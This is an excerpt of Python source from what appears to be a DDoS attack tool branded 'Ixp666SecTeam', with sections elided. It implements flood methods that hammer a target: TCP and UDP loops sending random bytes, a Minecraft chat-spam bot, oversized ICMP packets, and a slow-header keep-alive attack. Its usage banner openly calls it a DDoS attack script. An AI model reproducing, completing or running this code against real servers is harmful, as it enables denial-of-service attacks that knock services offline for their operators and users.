...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(18824)):
                continue
        Tools.safe_close(s)
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(18984), self._target):
                continue
        Tools.safe_close(s)
    ...
    def MCBOT(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            ...
            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(2559986)))):
                sleep(1.1)
    ...
    def _genrate_icmp(self) -> bytes:
        ...
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 88814)))
        ip.contains(icmp)
        return ip.get_packet()
        ...
        with suppress(Exception), self.open_connection() as s:
            ...
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 500000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)
...
class ToolsConsole:
    ...
    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@Ixp666SecTeam:~#"
    ...
    def usage():
        print((
                  '* Ixp666SecTeam - DDoS Attack Script With %d Methods\n'
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        ...
                        protocolid = Tools.protocolRex.search(str(s.recv(9981024)))
